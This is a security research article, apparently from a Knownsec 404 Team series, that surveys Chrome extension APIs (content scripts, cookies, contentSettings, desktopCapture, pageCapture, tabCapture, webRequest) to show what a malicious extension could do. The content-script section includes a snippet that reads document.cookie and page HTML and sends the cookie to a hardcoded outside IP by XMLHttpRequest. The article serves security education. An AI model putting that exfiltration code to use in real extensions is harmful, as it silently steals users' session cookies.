**Author: LoRexxar'@Knownsec 404 Team  
Chinese Version: **
In early 2019, Microsoft chose Chromium as the default browser and abandoned
the development of Edge. And on April 8, 19, Edge officially released the Edge
Dev browser developed based on Chromium, and provided supporting plug-in
management compatible with Chrome Ext. Chrome's plug-in system is increasingly
affecting the general population.
In this context, the security of Chrome Ext should also receive due attention.
"Getting Started with Chrome Ext Security from Zero" will start from the most
basic plug-in development, and gradually study the security issues from
various perspectives such as malicious plug-in and how malicious web pages use
plug-in to attack.
  * [Getting Started with Chrome Ext Security from Zero（1） -- A New Chrome Ext](https://paper.seebug.org/1094/ "Getting Started with Chrome Ext Security from Zero（1） -- A New Chrome Ext")
In the last part, we mainly talked about the most basic plug-in development.
After that, we will discuss the security issues of Chrome Ext. In this
article, we mainly start around Chrome Ext's API and explore how many browsers
can be implemented at the plug-in level. operating.
# Begining From a Simple Page
In order to explore the functional scope of the plugin, first we set up a
simple page.
    test pages
Next, we will explore various possible security issues and attack about the
functions of the Chrome ext api.
# Chrome ext js
## content-script
Content-script is the core function code of the plugin. Generally speaking,
the main JS code will appear in the content-script.
The way it was introduced was mentioned in the previous article. It needs to
be set in manfest.json.
    "content_scripts": [
       {
         "matches": ["http://*.nytimes.com/*"],
         "css": ["myStyles.css"],
         "js": ["contentScript.js"]
       }
     ],
  * 
The main feature of content_script js is that it loads at the same time as the
page, can access the dom, and can also call some APIs such as extension and
runtime, but not many, mainly used for interaction with the page.
`content_script js` can set the timing of corresponding script loading by
setting`run_at`.
  * document_idle is the default value, generally after the page dom is loaded and before the window.onload event fires
  * after document_start is loaded for css, before constructing page dom
  * document_end is after the dom is completed and before the resources such as pictures are loaded.
In addition, `content_script js` allows setting`all_frames` to make
`content_script js` act on all`frames` in the page. This configuration is off
by default because it is an unsafe configuration.
You can directly access the following Chrome Ext APIs in `content_script js`:
  * i18n
  * storage
  * runtime:
    * connect
    * getManifest
    * getURL
    * id
    * onConnect
    * onMessage
    * sendMessage
After understanding the basic configuration, let's take a look at what kind of
security issues `content_script js` can cause to a page.
### Security Issue
For `content_script js`, the first problem is that the plug-in can get the dom
of the page. In other words, the plug-in can operate all the dom in the page,
including non-httponly cookies.
Here we simply write following code into the `content_script js`.
    console.log(document.cookie);
    console.log(document.documentElement.outerHTML);
    var xhr = new XMLHttpRequest();
    xhr.open("get", "http://212.129.137.248?a="+document.cookie, false);
    xhr.send()
refresh the pages and load Plugin
The dom information in the page was successfully obtained, and if we sent the
message across domains through xhr, we also successfully received this request
in the background.
This means that if the plug-in author maliciously modifies the dom in the
plug-in, or even obtains the dom value and sends it out, it can be done in a
way that browser users do not feel.
In the entire browser plug-in system, this problem exists at all levels, among
which `content_script js`,`injected script js`, and `devtools js` can directly
access the operation dom, and popup js and background js can be accessed
through chrome .tabs.executeScript to dynamically execute js, you can also
execute js to modify the dom.
In addition to the previous problems, in fact, the chrome api that can be
accessed by `content_script js` is very small, and it does not involve any
security, which is not mentioned here.
## popup/background js
The two main differences between popup js and backround js are the timing of
loading. Since they cannot access the dom, these two parts of js rely on
event-driven in the browser.
The main difference is that background js will continue to execute after the
event is triggered, and it will not end until all visible views and ports are
closed. It is worth noting that the corresponding events are connected to the
page opening and clicking the expansion button, without directly affecting the
loading of the plugin.
In addition, the most important feature of these two parts of js is that they
can call most of the chrome ext apis. We will explore various APIs later.
## devtools js
devtools js is a special system in the plug-in system. If we generally call
F12 a developer tool, devtools js is a developer tool for developer tools.
The permissions and domain restrictions are generally consistent with content
js, and the only special thing is that it can operate 3 special APIs:
  * chrome.devtools.panels: about panel;
  * chrome.devtools.inspectedWindow: Get information about the window being inspected;
  * chrome.devtools.network: get information about network requests;
These three APIs are also mainly used to modify F12 and obtain information,
and the others are not described in detail.
# Chrome Ext Api
## chrome.cookies
The chrome.cookies api needs to give domain permissions and cookies
permissions, as defined in manfest.json:
          {
            "name": "My extension",
            ...
            "permissions": [
              "cookies",
              "*://*.google.com"
            ],
            ...
          }
After applying for such permission, we can obtain all cookies under the
google.com domain by calling chrome.cookies.
There are 5 methods in total
  * get - chrome.cookies.get (object details, function callback) Get eligible cookies
  * getAll - chrome.cookies.getAll (object details, function callback) Get all matching cookies
  * set - chrome.cookies.set (object details, function callback) Setting cookies
  * remove - chrome.cookies.remove (object details, function callback) Delete cookie
  * getAllCookieStores - chrome.cookies.getAllCookieStores (function callback) List all stored cookies
And a event
  * chrome.cookies.onChanged.addListener(function callback) Events when cookies are deleted or changed
When plugins have cookie permissions, they can read and write all cookies
stored by the browser.
## chrome.contentSettings
The chrome.contentSettings api is used to set the basic settings of the
browser when accessing a web page, including cookies, js, plugins and many
other configurations that take effect when accessing the web page.
Need to apply for permission of contentSettings in manifest.
      {
        "name": "My extension",
        ...
        "permissions": [
          "contentSettings"
        ],
        ...
      }
in contentSetting api, we can use method to modify setting.
    - ResourceIdentifier
    - Scope
    - ContentSetting
    - CookiesContentSetting
    - ImagesContentSetting
    - JavascriptContentSetting
    - LocationContentSetting
    - PluginsContentSetting
    - PopupsContentSetting
    - NotificationsContentSetting
    - FullscreenContentSetting
    - MouselockContentSetting
    - MicrophoneContentSetting
    - CameraContentSetting
    - PpapiBrokerContentSetting
    - MultipleAutomaticDownloadsContentSetting
## chrome.desktopCapture
chrome.desktopCapture can be used to take a screenshot (in real time) of the
entire screen, browser or a page.
You need to apply for desktopCapture permission in the manifest, and the
browser provides a method to get the media stream.
  * chooseDesktopMedia - integer chrome.desktopCapture.chooseDesktopMedia(array of DesktopCaptureSourceType sources, tabs.Tab targetTab, function callback)
  * cancelChooseDesktopMedia - chrome.desktopCapture.cancelChooseDesktopMedia(integer desktopMediaRequestId)
DesktopCaptureSourceType is set to "screen", "window", "tab", or "audio".
After obtaining the screenshot, this method will pass the media stream id to
the callback function. This id can be generated by the getUserMedia API. The
newly created streamid can only be used once and will expire in a few seconds.
Here is a simple demo.
    function gotStream(stream) {
      console.log("Received local stream");
      var video = document.querySelector("video");
      video.src = URL.createObjectURL(stream);
      localstream = stream;
      stream.onended = function() { console.log("Ended"); };
    }
    chrome.desktopCapture.chooseDesktopMedia(
    ["screen"], function (id) {
        navigator.webkitGetUserMedia({
            audio: false,
            video: {
                mandatory: {
                    chromeMediaSource: "desktop",
                    chromeMediaSourceId: id
                }
            }
        }, gotStream);
    }
    });
Here is a real-time stream.
## chrome.pageCapture
The method of chrome.pageCapture is similar to desktopCapture. You need to
apply for pageCapture permission in the manifest.
      {
        "name": "My extension",
        ...
        "permissions": [
          "pageCapture"
        ],
        ...
      }
This is a only one method.
  * saveAsMHTML - chrome.pageCapture.saveAsMHTML(object details, function callback)
By calling this method, you can get the source code of the page under any tab
of the current browser and save it as an object in blob format.
The only problem is that you need to know the tabid first.
![
](https://images.seebug.org/content/images/2019/12/3450ac03-b6a4-4a74-827b-b1de2360ccca.png-w331s)
## chrome.tabCapture
chrome.tabCapture is similar to chrome.desktopCapture. The main difference is
that tabCapture can capture video and audio of tabs, which is more targeted
than desktopCapture.
It is also necessary to declare the tabCapture permission in advance.
Main method is:
  * capture - chrome.tabCapture.capture( CaptureOptions options, function callback)
  * getCapturedTabs - chrome.tabCapture.getCapturedTabs(function callback)
  * captureOffscreenTab - chrome.tabCapture.captureOffscreenTab(string startUrl, CaptureOptions options, function callback)
  * getMediaStreamId - chrome.tabCapture.getMediaStreamId(object options, function callback)
Most of the APIs here are used to capture media streams, which is not much
different from the use of desktopCapture.
## chrome.webRequest
chrome.webRequest is the primary user for observing and analyzing traffic and
allows requests to be intercepted, blocked, or modified during runtime.
In addition to the webRequest in the manifest, this API also has permissions
for the corresponding domain, such as `*: //*.*: *`, and it should be noted
that if you need to intercept the request, you also need the
webRequestBlocking permission.
    {
            "name": "My extension",
            ...
            "permissions": [
              "webRequest",
              "*://*.google.com/"
            ],
            ...
          }
  * 
Before understanding this API in detail, we must first understand the flow of
a request at the browser level and the corresponding event trigger.
![
](https://images.seebug.org/content/images/2019/12/739f54e3-4596-45f5-bca6-74abb5607a7d.png-w331s)
In the world of browser plug-ins, the corresponding event trigger is divided
into multiple levels, and each level performs processing one by one.
Since there are too many interfaces under this api, here is an example
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
          return {cancel: details.url.indexOf("://www.baidu.com/") != -1};
        },
        {urls: [""]},
        ["blocking"]);
When visiting Baidu, the request will be blocked
![
](https://images.seebug.org/content/images/2019/12/1fa3e81b-4453-4d90-a1bc-280769dc0964.png-w331s)
When redirectUrl is set, a corresponding jump will be generated.
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
            if(details.url.indexOf("://www.baidu.com/") != -1){
                return {redirectUrl: "https://lorexxar.cn"};
            }
        },
        {urls: [""]},
        ["blocking"]);